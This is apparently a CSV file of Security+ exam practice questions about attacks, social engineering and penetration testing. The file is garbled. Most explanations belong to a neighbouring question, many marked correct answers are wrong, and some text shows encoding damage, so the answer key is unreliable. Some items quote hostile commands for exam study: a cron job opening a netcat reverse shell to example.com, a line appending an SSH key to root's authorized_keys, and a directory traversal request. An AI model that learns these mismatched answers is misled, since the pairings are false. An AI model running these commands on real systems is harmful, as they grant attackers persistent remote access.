Chapter,Number,Source,Value,Media,A,B,C,D,CorrectAnswer,Explanation
Objective-1,112,CH1_SEIDL,Adam wants to download lists of malicious or untrustworthy IP addresses and domains using STIX and TAXII. What type of service is he looking for?,, A. A vulnerability feed, B. A threat feed, C. A hunting feed, D. A rule feed,B,"Malicious tools like BadUSB can make a USB cable or drive look like a keyboard when they are plugged in. Somewhat strangely, the Security+ exam outline focuses on malicious USB cables, but you should be aware that malicious thumb drives are far more common and have been used by penetration testers simply by dropping them in a parking lot near their intended target. A Trojan or a worm is a possibility, but the clue involving the keyboard would point to a USB device as the first place Naomi should look."
Objective-1,113,CH1_SEIDL,"During an incident investigation, Naomi notices that a second keyboard was plugged into a system in a public area of her companyâ€™s building. Shortly after that event, the system was infected with malware, resulting in a data breach. What should Naomi look for in her inperson investigation?",, A. A Trojan horse download, B. A malicious USB cable or drive, C. A worm, D. None of the above,D,"Using a pass-the-hash attack requires attackers to acquire a legitimate hash, and then present it to a server or service. A real hash was provided; it was not spoofed. An evil twin is a wireless attack. Shimming is inserting malicious code between an application and a library."
Objective-1,114,CH1_SEIDL,"You are responsible for incident response at Acme Corporation. You have discovered that someone has been able to circumvent the Windows authentication process for a specific network application. It appears that the attacker took the stored hash of the password and sent it directly to the backend authentication service, bypassing the application. What type of attack is this?",, A. Hash spoofing, B. Evil twin, C. Shimming, D. Pass the hash,B,"Claiming to be from tech support is claiming authority, and the story the caller gave indicates urgency. Yes, this caller used urgency (the virus spread) but did not attempt intimidation. Authority and trust are closely related, and in this case urgency was the second major factor. This caller used urgency but not intimidation."
Objective-1,115,CH1_SEIDL,A user in your company reports that she received a call from someone claiming to be from the company technical support team. The caller stated that there was a virus spreading through the company and they needed immediate access to the employeeâ€™s computer to stop it from being infected. What social-engineering principles did the caller use to try to trick the employee?,, A. Urgency and intimidation, B. Urgency and authority, C. Authority and trust, D. Intimidation and authority,B,"The questions tells us that these are Windows 10 systems, a current operating system.  From there, it is safe to presume that something has gone wrong with the patching process or that there isn’t a patching process. Elaine should investigate both what the process is and if there are specific reasons the systems are not patched. Since we know these systems run a current OS, option A, unsupported operating systems, can be ruled out. The vulnerabilities are specifically noted to be Windows vulnerabilities, ruling out option C, and there is no mention of protocols, eliminating option D as well."
Objective-1,116,CH1_SEIDL,"After running a vulnerability scan, Elaine discovers that the Windows 10 workstations in her companyâ€™s warehouse are vulnerable to multiple known Windows exploits. What should she identify as the root cause in her report to management?",, A. Unsupported operating systems, B. Improper or weak patch management for the operating systems, C. Improper or weak patch management for the firmware of the systems, D. Use of unsecure protocols,A,"Address Resolution Protocol (ARP) poisoning, often called ARP spoofing, occurs when an attacker sends malicious ARP packets to the default gateway of a local area network, causing it to change the mappings it maintains between hardware (MAC) addresses and IP addresses. In DNS poisoning, domain name to IP address entries in a DNS server are altered. This attack did not involve an on-path attack. A backdoor provides access to the attacker, which circumvents normal authentication."
Objective-1,117,CH1_SEIDL,"Ahmed has discovered that attackers spoofed IP addresses to cause them to resolve to a different hardware address. The manipulation has changed the tables maintained by the default gateway for the local network, causing data destined for one specific MAC address to now be routed elsewhere. What type of attack is this?",, A. ARP poisoning, B. DNS poisoning, C. On-path attack, D. Backdoor,A,"In a known environment (white-box) test, the tester is given extensive knowledge of the target network. Full disclosure is not a term used to describe testing. Unknown environment (black-box) testing involves only very minimal information being given to the tester. A red team test simulates a particular type of attacker, such as a nation-state attacker, an insider, or other type of attacker."
Objective-1,118,CH1_SEIDL,What type of penetration test is being done when the tester is given extensive knowledge of the target network?,, A. Known environment, B. Full disclosure, C. Unknown environment, D. Red team,C,"Social engineering is about using people skills to get information you would not otherwise have access to. Illegal copying of software isn’t social engineering, nor is gathering of discarded manuals and printouts, which describes dumpster diving. Phishing emails use some social engineering, but that is one example of social engineering, not a definition."
Objective-1,119,CH1_SEIDL,"Your company is instituting a new security awareness program. You are responsible for educating end users on a variety of threats, including social engineering. Which of the following best defines social engineering?",, A. Illegal copying of software, B. Gathering information from discarded manuals and printouts, C. Using people skills to obtain proprietary information, D. Phishing emails,C,"Shoulder surfing involves literally looking over someone’s shoulder in a public place and gathering information, perhaps login passwords. ARP poisoning alters the Address Resolution Protocol tables in the switch. Phishing is an attempt to gather information, often via email, or to convince a user to click a link to, and/or download, an attachment. A Smurf attack is a historical form of denial-of-service attack."
Objective-1,120,CH1_SEIDL,Which of the following attacks can be caused by a user being unaware of their physical surroundings?,, A. ARP Poisoning, B. Phishing, C. Shoulder Surfing, D. Smurf Attack,A,"Invoice scams typically either send legitimate appearing invoices to trick an organization into paying the fake invoice, or they focus on tricking employees into logging into a fake site to allow the acquisition of credentials. They typically do not focus on delivery of malware or stealing cryptocurrency."
Objective-1,121,CH1_SEIDL,What are the two most common goals of invoice scams?,, A. Receiving money or acquiring credentials, B. Acquiring credentials or delivering a rootkit, C. Receiving money or stealing cryptocurrency, D. Acquiring credentials or delivering ransomware,B,Vulnerability scans use automated and semiautomated processes to identify known vulnerabilities. Audits usually involve document checks. Unknown and known environment testing are both types of penetration tests.
Objective-1,122,CH1_SEIDL,Which of the following type of testing uses an automated process of proactively identifying vulnerabilities of the computing systems present on a network?,, A. Security audit, B. Vulnerability scanning, C. A known environment test, D. An unknown environment test,A,"A partially known (gray-box) test involves the tester being given partial information about the network. A known environment (white-box) test involves the tester being given full or nearly full information about the target network, and unknown (black-box) environments don’t provide information about the target environment. Masked is not a testing term."
Objective-1,123,CH1_SEIDL,John has been asked to do a penetration test of a company. He has been given general information but no details about the network. What kind of test is this?,, A. Partially known environment, B. Known environment, C. Unknown environment, D. Masked,D,"In the on-path (man-in-the-middle) attack, the attacker is between the client and the server, and to either end, the attacker appears like the legitimate other end. This does not describe any denial-of-service attack. A replay attack involves resending login information. Although an on-path attack can be used to perform eavesdropping, in this scenario the best answer is an on-path attack."
Objective-1,124,CH1_SEIDL,Under which type of attack does an attackerâ€™s system appear to be the server to the real client and appear to be the client to the real server?,, A. Denial-of-service, B. Replay, C. Eavesdropping, D. On-path,A,"In a man-in-the-browser attack, the malware intercepts calls from the browser to the system, such as system libraries. On-path attack involves having some process between the two ends of communication in order to compromise passwords or cryptography keys. In a buffer overflow attack, more data is put into a variable than the variable was intended to hold. Session hijacking involves taking over an authenticated session."
Objective-1,125,CH1_SEIDL,"You are a security administrator for Acme Corporation. You have discovered malware on some of your companyâ€™s machines. This malware seems to intercept calls from the web browser to libraries, and then manipulates the browser calls. What type of attack is this?",, A. Man in the browser, B. On-path attack, C. Buffer overflow, D. Session hijacking,B,"Uniform resource locator (URL) redirection is frequently used in web applications to direct users to another service or portion of the site. If this redirection is not properly secured, it can be used to redirect to an arbitrary untrusted or malicious site. This issue, known as Open Redirect vulnerabilities, remains quite common. The code shown does not contain SQL or LDAP code, and there is no mention of changing DNS information on the server, thus making the other options incorrect."
Objective-1,126,CH1_SEIDL,Tony is reviewing a web application and discovers the website generates links like the following: https://www.example.com/login.html?Relay=http%3A%2F%2Fexample.com%2Fsite .html What type of vulnerability is this code most likely to be susceptible to?,, A. SQL injection, B. URL redirection, C. DNS poisoning, D. LDAP injection,D,"Placing a larger integer value into a smaller integer variable is an integer overflow.  Memory overflow is not a term used, and memory leak is about allocating memory and not deallocating it. Buffer overflows often involve arrays. Variable overflow is not a term used in the industry."
Objective-1,127,CH1_SEIDL,You are responsible for software testing at Acme Corporation. You want to check all software for bugs that might be used by an attacker to gain entrance into the software or your network. You have discovered a web application that would allow a user to attempt to put a 64-bit value into a 4-byte integer variable. What is this type of flaw?,, A. Memory overflow, B. Buffer overflow, C. Variable overflow, D. Integer overflow,B,"Cross-site request forgery (XSRF or CSRF) takes advantage of the cookies and URL parameters legitimate sites use to help track and serve their visitors. In an XSRF or a CSRF attack, attackers leverage authorized, authenticated users’ rights by providing them with a cookie or session data that will be read and processed when they visit the target site. An attacker may embed a link within an email or other location that will be clicked or executed by the user or an automated process with that user’s session already open. This is not SQL injection, which would attempt to send commands to a database, or LDAP injection, which gathers data from a directory server. Cross-site scripting (XSS) would embed code in usersubmittable data fields that a website will display to other users, causing it to run."
Objective-1,128,CH1_SEIDL,Angela has discovered an attack against some of the users of her website that leverage URL parameters and cookies to make legitimate users perform unwanted actions. What type of attack has she most likely discovered?,, A. SQL injection, B. Cross-site request forgery, C. LDAP injection, D. Cross-site scripting,D,"You will need to be able to read and understand basic scripts and programs in multiple languages for the Security+ exam. In this example, you can recognize common Bash syntax and see that it is adding a key to the authorized keys file for root. If that’s not an expected script, you should be worried!"
Objective-1,129,CH1_SEIDL,"Nathan discovers the following code in the directory of a compromised user. What language is it using, and what will it do?  echo ""ssh-rsa ABBAB4KAE9sdafAK...Mq/jc5YLfnAnbFDRABMhuWzaWUp root@localhost"" >> /root/.ssh/authorized_keys",," A. Python, adds an authorized SSH key"," B. Bash, connects to another system using an SSH key"," C. Python, connects to another system using an SSH key"," D. Bash, adds an authorized SSH key",D,"Rootkits provide administrative access to systems, thus the “root” in rootkit. A Trojan horse combines malware with a legitimate program. A logic bomb performs its malicious activity when some condition is met. A multipartite virus infects the boot sector and a file."
Objective-1,130,CH1_SEIDL,Jared has discovered malware on the workstations of several users. This particular malware provides administrative privileges for the workstation to an external hacker. What best describes this malware?,, A. Trojan horse, B. Logic bomb, C. Multipartite virus, D. Rootkit,C,"Memory leaks can cause crashes, resulting in an outage. This targets the availability leg of the CIA (confidentiality, integrity, and availability) triad, making it a security issue.  Memory leaks do not actually leak to other locations, nor do they allow code injection.  Instead memory leaks cause memory exhaustion or other issues over time as memory is not properly reclaimed."
Objective-1,131,CH1_SEIDL,Why are memory leaks a potential security issue?,, A. They can expose sensitive data., B. They can allow attackers to inject code via the leak., C. They can cause crashes, D. None of the above,B,"This question combines two pieces of knowledge: how botnet command and control works, and that IRC’s default port is TCP 6667. Although this could be one of the other answers, the most likely answer given the information available is a botnet that uses Internet Relay Chat (IRC) as its command-and-control channel."
Objective-1,132,CH1_SEIDL,"Michelle discovers that a number of systems throughout her organization are connecting to a changing set of remote systems on TCP port 6667. What is the most likely cause of this, if she believes the traffic is not legitimate?",, A. An alternate service port for web traffic, B. Botnet command and control via IRC, C. Downloads via a peer-to-peer network, D. Remote access Trojans,A,"Software updates for consumer-grade wireless routers are typically applied as firmware updates, and Susan should recommend that the business owner regularly upgrade their wireless router firmware. If updates are not available, they may need to purchase a new router that will continue to receive updates and configure it appropriately. This is not a default configuration issue nor an unsecured administrative account—neither is mentioned, nor is encryption."
Objective-1,133,CH1_SEIDL,Susan performs a vulnerability scan of a small business network and discovers that the organizationâ€™s consumer-grade wireless router has a vulnerability in its web server. What issue should she address in her findings?,, A. Firmware patch management, B. Default configuration issues, C. An unsecured administrative account, D. Weak encryption settings,B,"Radio frequency identification (RFID) is commonly used for access badges, inventory systems, and even for identifying pets using implantable chips. In a penetration testing scenario, attackers are most likely to attempt to acquire or clone RFID-based access badges to gain admittance to a building or office suite."
Objective-1,134,CH1_SEIDL,Where is an RFID attack most likely to occur as part of a penetration test?,, A. System authentication, B. Access badges, C. Web application access, D. VPN logins,B,"The word you will need to know for the Security+ exam for phishing via SMS is “smishing,” a term that combines SMS and phishing. Bluejacking sends unsolicited messages to Bluetooth devices, and phonejacking and text whaling were made up for this question."
Objective-1,135,CH1_SEIDL,What type of phishing attack occurs via text messages?,, A. Bluejacking, B. Smishing, C. Phonejacking, D. Text whaling,B,"This is vishing, or using voice calls for phishing. Spear phishing is targeting a small, specific group. War dialing is dialing numbers hoping a computer modem answers. Robocalling is used to place unsolicited telemarketing calls."
Objective-1,136,CH1_SEIDL,"Users in your company report someone has been calling their extension and claiming to be doing a survey for a large vendor. Based on the questions asked in the survey, you suspect that this is a scam to elicit information from your companyâ€™s employees. What best describes this?",, A. Spear phishing, B. Vishing, C. War dialing, D. Robocalling,A,"Worms spread themselves via vulnerabilities, making this an example of a worm. A virus is software that self-replicates. A logic bomb executes its malicious activity when some condition is met. A Trojan horse combines malware with a legitimate program."
Objective-1,137,CH1_SEIDL,John is analyzing a recent malware infection on his company network. He discovers malware that can spread rapidly via vulnerable network services and does not require any interaction from the user. What best describes this malware?,, A. Worm, B. Virus, C. Logic bomb, D. Trojan horse,B,"Dumpster diving is the process of going through the trash to find documents. Shredding documents will help to prevent dumpster diving, but truly dedicated dumpster divers can reassemble even well-shredded documents, leading some organizations to burn their most sensitive documents after they have been shredded. Phishing is often done via email or phone and is an attempt to elicit information or convince a user to click a link or open an attachment. Shoulder surfing is literally looking over someone’s shoulder. In the on-path (man-in-the-middle) attack, the attacker is between the client and the server, and to either end, the attacker appears like the legitimate other end."
Objective-1,138,CH1_SEIDL,Your company has issued some new security directives. One of these new directives is that all documents must be shredded before being thrown out. What type of attack is this trying to prevent?,, A. Phishing, B. Dumpster diving, C. Shoulder surfing, D. On-path attack,B,"Systems should not have a rootkit on them when a penetration test starts, and rootkits installed during the test should be fully removed and securely deleted. The rest of the options are all typical parts of a penetration testing cleanup process. You can read more at the penetration testing standard site at www.pentest-standard.org/index.php/ Post_Exploitation."
Objective-1,139,CH1_SEIDL,Which of the following is not a common part of a cleanup process after a penetration test?,, A. Removing all executables and scripts from the compromised system, B. Restoring all rootkits to their original settings on the system, C. Returning all system settings and application configurations to their original configurations, D. Removing any user accounts created during the penetration test,C,"This is an example of an online brute-force dictionary attack. Dictionary attacks use common passwords as well as common substitutions to attempt to break into a system or service. Back-off algorithms that lock out attackers after a small number of incorrect password attempts can help slow or stop dictionary attacks and other brute-force password attacks. Rainbow tables are tables of precomputed hashes. The birthday attack is a method for generating collisions of hashes. Finally, no spoofing is indicated in this scenario."
Objective-1,140,CH1_SEIDL,You have discovered that someone has been trying to log on to your web server. The person has tried a wide range of likely passwords. What type of attack is this?,, A. Rainbow table, B. Birthday attack, C. Dictionary attack, D. Spoofing,C,"Jim has discovered a skimmer, a device used for skimming attacks that capture credit and debit card information. Skimmers may be able to wirelessly upload the information they capture, or they may require attackers to retrieve data in person. Some skimmers include cameras to capture keypresses for PINs and other data. A replay attack would reuse credentials or other information to act like a legitimate user, a race condition occurs when the time of use and time of check of data can be exploited, and a card cloner would be used after cards were skimmed to duplicate them."
Objective-1,141,CH1_SEIDL,Jim discovers a physical device attached to a gas pumpâ€™s credit card reader. What type of attack has he likely discovered?,, A. A replay attack, B. A race condition, C. A skimmer, D. A card cloner,D,Active reconnaissance connects to the network using techniques such as port scanning. Both active and passive reconnaissance can be done manually or with tools. Black-box and white-box refer to the amount of information the tester is given. Attackers and testers use both types of reconnaissance.
Objective-1,142,CH1_SEIDL,What is the primary difference between active and passive reconnaissance?,," A. Active will be done manually, passive with tools.", B. Active is done with black-box tests and passive with white-box tests., C. Active is usually done by attackers and passive by testers., D. Active will actually connect to the network and could be detected; passive won’t.,D,"Browser toolbars are sometimes examples of PUPs, or potentially unwanted programs like spyware or adware. A worm is a type of malware that spreads on its own by exploiting vulnerabilities on network-connected systems. Once it infects a system, it will typically scan for other vulnerable systems and continue to spread. A RAT is a remote-access Trojan, and a rootkit is used to gain and keep administrative access."
Objective-1,143,CH1_SEIDL,A browser toolbar is an example of what type of malware?,, A. A rootkit, B. A RAT, C. A worm, D. A PUP,B,"OSINT, or open source intelligence, is intelligence information obtained from public sources like search engines, websites, domain name registrars, and a host of other locations. OPSEC, or operational security, refers to habits such as not disclosing unnecessary information. STIX is the Structured Threat Intelligence Exchange protocol, and IntCon was made up for this question."
Objective-1,144,CH1_SEIDL,What term describes data that is collected from publicly available sources that can be used in an intelligence context?,, A. OPSEC, B. OSINT, C. IntCon, D. STIX,C,"Watering hole attacks target groups by focusing on common shared behaviors like visiting specific websites. If attackers can compromise the site or deliver targeted attacks through it, they can then target that group. Watercooler, phishing net, and phish pond attacks were all made up for this question."
Objective-1,145,CH1_SEIDL,What type of attack targets a specific group of users by infecting one or more websites that that group is specifically known to visit frequently?,, A. A watercooler attack, B. A phishing net attack, C. A watering hole attack, D. A phish pond attack,C,"Although Structured Query Language (SQL) queries are often parameterized, Lightweight Directory Access Protocol (LDAP) security practices focus instead on user input validation and filtering of output to ensure that an excessive amount of data is not being returned in queries. As with all services, securely configuring LDAP services is one of the first protections that should be put in place."
Objective-1,146,CH1_SEIDL,Tracy is concerned about LDAP injection attacks against her directory server. Which of the following is not a common technique to prevent LDAP injection attacks?,, A. Secure configuration of LDAP, B. User input validation, C. LDAP query parameterization, D. Output filtering rules,B,"Although it may sound dramatic, sites accessible via Tor or other tools that separate them from the rest of the Internet are sometimes called “the dark web.” The Security+ exam uses this term, so you need to be aware of it for the exam. The rest of the options were made up and may be almost as silly as calling a section of the Internet the dark web."
Objective-1,147,CH1_SEIDL,Fred uses a Tor proxy to browse for sites as part of his threat intelligence. What term is frequently used to describe this part of the Internet?,, A. Through the looking glass, B. The dark web, C. The underweb, D. Onion-space,B,"URL redirection has many legitimate uses, from redirecting traffic from no-longersupported links to current replacements to URL shortening, but URL redirection was commonly used for phishing attacks. Modern browsers display the full, real URL, helping to limit the impact of this type of attack. Certificate expiration tracking is used to ensure that website certificates are current, but it does not prevent URL redirection attacks. JavaScript being enabled or disabling cookies is not helpful for this purpose either."
Objective-1,148,CH1_SEIDL,What browser feature is used to help prevent successful URL redirection attacks?,, A. Certificate expiration tracking, B. Displaying the full real URL, C. Disabling cookies, D. Enabling JavaScript,A,"Vulnerabilities in cloud services require work on the part of the cloud service provider to remediate them. You can remediate most vulnerabilities in your own infrastructure yourself without a third party. Vulnerabilities in cloud services and local infrastructure can both be as severe and take as much time to remediate. Regardless of where your organization stores its data, your responsibility for it is likely the same!"
Objective-1,149,CH1_SEIDL,What is the most significant difference between cloud service-based and on-premises vulnerabilities?,, A. Your ability to remediate it yourself, B. The severity of the vulnerability, C. The time required to remediate, D. Your responsibility for compromised data,C,"Consumer wireless routers provide local administrative access via their default credentials. Although they recommend that you change the password (and sometimes the username for greater security), many installations result in an unsecured administrative account.  The other answers are all common issues but not what is described in the question."
Objective-1,150,CH1_SEIDL,Christina runs a vulnerability scan of a customer network and discovers that a consumer wireless router on the network returns a result reporting default login credentials. What common configuration issue has she encountered?,, A. An unpatched device, B. An out of support device, C. An unsecured administrator account, D. An unsecured user account,A,A red team is a team that tests security by using tools and techniques like an actual attacker. A blue team is a defender team that protects against attackers (and testers like red teams!). Purple teams are a combination of red and blue teams intended to leverage the techniques and tools from both sides to improve organizational security. White teams oversee cybersecurity contests and judge events between red teams and blue teams.
Objective-1,151,CH1_SEIDL,What type of team is used to test security by using tools and techniques that an actual attacker would use?,, A. A red team, B. A blue team, C. A white team, D. A purple team,A,"Directory traversal attacks attempt to exploit tools that can read directories and files by moving through the directory structure. The example would try to read the config.txt file three layers above the working directory of the web application itself. Adding common directory names or common filenames can allow attackers (or penetration testers) to read other files in accessible directories if they are not properly secured. The remainder of the options were made up for this question, although Slashdot is an actual website."
Objective-1,152,CH1_SEIDL,While reviewing web logs for her organizationâ€™s website Kathleen discovers the entry shown here: GET http://example.com/viewarticle.php?view=../../../config.txt HTTP/1.1 What type of attack has she potentially discovered?,, A. A directory traversal attacks, B. A web application buffer overflow, C. A directory recursion attack, D. A slashdot attack,A,"Security orchestration, automation, and response (SOAR) services are designed to integrate with a broader range of both internal and external applications. Both security information and event management (SIEM) and SOAR systems typically include threat and vulnerability management tools, as well as security operations’ automation capabilities."
Objective-1,153,CH1_SEIDL,What is the key differentiator between SOAR and SIEM systems?,, A. SOAR integrates with a wider range of applications., B. SIEM includes threat and vulnerability management tools., C. SOAR includes security operations automation., D. SIEM includes security operations automation.,A,"A known environment (white-box) test involves providing extensive information, as described in this scenario. A known environment test could be internal or external. This scenario describes the opposite of an unknown environment (black-box) test, which would involve zero knowledge. Finally, threat test is not a term used in penetration testing."
Objective-1,154,CH1_SEIDL,"Your company has hired a penetration testing firm to test the network. For the test, you have given the company details on operating systems you use, applications you run, and network devices. What best describes this type of test?",, A. Known environment test, B. External test, C. Unknown environment test, D. Threat test,C,The Windows Security Account Manager (SAM) file and the /etc/shadow file for Linux systems both contain passwords and are popular targets for offline brute-force attacks.
Objective-1,155,CH1_SEIDL,What two files are commonly attacked using offline brute-force attacks?,, A. The Windows registry and the Linux /etc/passwd file, B. The Windows SAM and the Linux /etc/passwd file, C. The Windows SAM and the Linux /etc/shadow file, D. The Windows registry and the Linux /etc/shadow file,C,"An SSL stripping attack requires attackers to persuade a victim to send traffic through them via HTTP while continuing to send HTTPS encrypted traffic to the legitimate server by pretending to be the victim. This is not a brute-force attack, a Trojan attack would require malware, and a downgrade attack would try to move the encrypted session to a less secure encryption protocol."
Objective-1,156,CH1_SEIDL,What type of attack is an SSL stripping attack?,, A. A brute-force attack, B. A Trojan attack, C. An on-path attack, D. A downgrade attack,C,The U.S. Trusted Foundry program is intended to prevent supply chain attacks by ensuring end-to-end supply chain security for important integrated circuits and electronics.
Objective-1,157,CH1_SEIDL,What type of attack is the U.S. Trusted Foundry program intended to help prevent?,, A. Critical infrastructure attacks, B. Metalwork and casting attacks, C. Supply chain attacks, D. Software source code attacks,B,"Threat maps like those found at threatmap.fortiguard.com and threatmap .checkpoint.com are visualizations of real-time or near real-time data gathered by vendors and other organizations that can help visualize major threats and aid in analysis of them. Pie charts may be done in real time via security information and event management (SIEM) or other systems, but note that no SIEM or other device was mentioned. A dark web tracker was made up for the question, and OSINT repositories wouldn’t show real-time data like this."
Objective-1,158,CH1_SEIDL,Nicole wants to show the management in her organization real-time data about attacks from around the world via multiple service providers in a visual way. What type of threat intelligence tool is often used for this purpose?,, A. A pie chart, B. A threat map, C. A dark web tracker, D. An OSINT repository,B,"Bluesnarfing involves accessing data from a Bluetooth device when it is in range. Bluejacking involves sending unsolicited messages to Bluetooth devices when they are in range.  Evil twin attacks use a rogue access point whose name is similar or identical to that of a legitimate access point. A RAT is a remote-access Trojan, and nothing in this scenario points to a RAT being the cause of the stolen data."
Objective-1,159,CH1_SEIDL,"You have noticed that when in a crowded area, data from your cell phone is stolen. Later investigation shows a Bluetooth connection to your phone, one that you cannot explain.  What describes this attack?",, A. Bluejacking, B. Bluesnarfing, C. Evil twin, D. RAT,B,"The rules of engagement for a penetration test typically include the type and scope of testing, client contact information and requirements for when the team should be notified, sensitive data handling requirements, and details of regular status meetings and reports."
Objective-1,160,CH1_SEIDL,"The type and scope of testing, client contact details, how sensitive data will be handled, and the type and frequency of status meetings and reports are all common elements of what artifact of a penetration test?",, A. The black-box outline, B. The rules of engagement, C. The white-box outline, D. The close-out report,C,"This command starts a reverse shell connecting to example.com on port 8989 every hour. If you’re not familiar with cron, you should take a moment to read the basics of cron commands and what you can do with them—you can read a man page for cron at manpages.ubuntu.com/manpages/focal/man8/cron.8.html."
Objective-1,161,CH1_SEIDL,Amanda encounters a Bash script that runs the following command: crontab -e 0 * * * * nc example.com 8989 -e /bin/bash What does this command do?,, A. It checks the time every hour., B. It pulls data from example.com every minute., C. It sets up a reverse shell., D. None of the above,C,"The penetration tester leveraged the principle of urgency and also used some elements of authority by claiming to be a senior member of the organization. They didn’t threaten or intimidate the help desk staff member and did not make something seem scarce, nor did they attempt to build trust with the staff member."
Objective-1,162,CH1_SEIDL,A penetration tester called a help desk staff member at the company that Charles works at and claimed to be a senior executive who needed her password changed immediately due to an important meeting they needed to conduct that would start in a few minutes. The staff member changed the executiveâ€™s password to a password that the penetration tester provided.  What social engineering principle did the penetration tester leverage to accomplish this attack?,, A. Intimidation, B. Scarcity, C. Urgency, D. Trust,A,"Proprietary, or closed threat, intelligence is threat intelligence that is not openly available. OSINT, or open source threat intelligence, is freely available. ELINT is a military term for electronic and signals intelligence. Corporate threat intelligence was made up for this question."
Objective-1,163,CH1_SEIDL,Patrick has subscribed to a commercial threat intelligence feed that is only provided to subscribers who have been vetted and who pay a monthly fee. What industry term is used to refer to this type of threat intelligence?,, A. Proprietary threat intelligence, B. OSINT, C. ELINT, D. Corporate threat intelligence,B,"CompTIA defines “maneuver” in the context of threat hunting as how to think like a malicious user to help you identify potential indicators of compromise in your environment.  Outside of the Security+ exam, this is not a commonly used term in normal security practice, although it does make an appearance in military usage. Since this term is not common outside of the Security+ exam, make sure you understand the CompTIA definition. Intelligence fusion adds multiple intelligence sources together, threat feeds are used to provide information about threats, and advisories and bulletins are often combined with threat feeds to understand new attacks, vulnerabilities, and other threat information."
Objective-1,164,CH1_SEIDL,What threat hunting concept involves thinking like a malicious actor to help identify indicators of compromise that might otherwise be hidden?,, A. Intelligence fusion, B. Maneuver, C. Threat feed analysis, D. Bulletin analysis,B,"Script kiddies are the least resourced of the common threat actors listed above. In general, they flow from national state actors as the most highly resourced, to organized crime, to hacktivists, to inside actors, and then to script kiddies as the least capable and least resourced actors. As with any scale like this, there is room for some variability between specific actors, but for the exam, you should track them in that order."
Objective-1,165,CH1_SEIDL,What type of malicious actor will typically have the least amount of resources available to them?,, A. Nation-states, B. Script kiddies, C. Hacktivists, D. Organized crime,B,"A SYN flood is a type of resource exhaustion attack and uses up all available sessions on the system it is aimed at. Although a SYN flood can be a DDoS, no mention was made of multiple source machines for the attack. No application was mentioned, and a SYN flood targets the TCP/IP stack on the system rather than an application. No vulnerability was mentioned, and none is required for a SYN flood, since it simply tries to overwhelm the target’s ability to handle the opened connections. Protections against SYN floods tend to focus on preventing opened connections from causing resource exhaustion and identifying and blocking abusive hosts."
Objective-1,166,CH1_SEIDL,A SYN flood seeks to overwhelm a system by tying up all the open sessions that it can create.  What type of attack is this?,, A. A DDoS, B. A resource exhaustion attack, C. An application exploit, D. A vulnerability exploit,A,"Pretexting is a type of social engineering that involves using a false motive and lying to obtain information. Here, the penetration tester lied about their role and why they are calling (impersonation), and then built some trust with the user before asking for personal information. A watering hole attack leverages a website that the targeted users all use and places malware on it to achieve their purpose. Prepending is described by CompTIA as “adding an expression or a phrase,” and shoulder surfing involves looking over an individual’s shoulder or otherwise observing them entering sensitive information like passwords."
Objective-1,167,CH1_SEIDL,"A penetration tester calls a staff member for her target organization and introduces herself as a member of the IT support team. She asks if the staff member has encountered a problem with their system, then proceeds to ask for details about the individual, claiming she needs to verify that she is talking to the right person. What type of social engineering attack is this?",, A. Pretexting, B. A watering hole attack, C. Prepending, D. Shoulder surfing,C,"You may be familiar with the term war driving, but war flying is increasingly common as drones have entered wide use. Although penetration testers are somewhat unlikely to fly a helicopter or airplane over a target site, inexpensive drones can provide useful insight into both physical security and wireless network coverage if equipped with the right hardware. Droning and aerial snooping were made up for this question, and Air Snarf is an old tool for capturing usernames and passwords on vulnerable wireless networks."
Objective-1,168,CH1_SEIDL,What term describes the use of airplanes or drones to gather network or other information as part of a penetration test or intelligence gathering operation?,, A. Droning, B. Air Snarfing, C. War flying, D. Aerial snooping,C,"Many organizations have legacy platforms in place that cannot be patched or upgraded but that are still an important part of their business. Security professionals are often asked to suggest ways to secure the systems while leaving them operational. Common options include moving the devices to an isolated virtual LAN (VLAN), disconnecting the devices from the network and ensuring they are not plugged back in, and using a firewall or other security device to ensure that the legacy system is protected from attacks and cannot browse the Internet or perform other actions that could result in compromise."
Objective-1,169,CH1_SEIDL,Gabby wants to protect a legacy platform with known vulnerabilities. Which of the following is not a common option for this?,, A. Disconnect it from the network., B. Place the device behind a dedicated firewall and restrict inbound and outbound traffic., C. Rely on the outdated OS to confuse attackers., D. Move the device to a protected VLAN.,B,"According to the national council of ISACs, information sharing and analysis centers, “Information Sharing and Analysis Centers (ISACs) help critical infrastructure owners and operators protect their facilities, personnel and customers from cyber and physical security threats and other hazards. ISACs collect, analyze and disseminate actionable threat information to their members and provide members with tools to mitigate risks and enhance resiliency.” IRTs are incident response teams, Feedburner is Google’s RSS feed management tool, and vertical threat feeds is not an industry term."
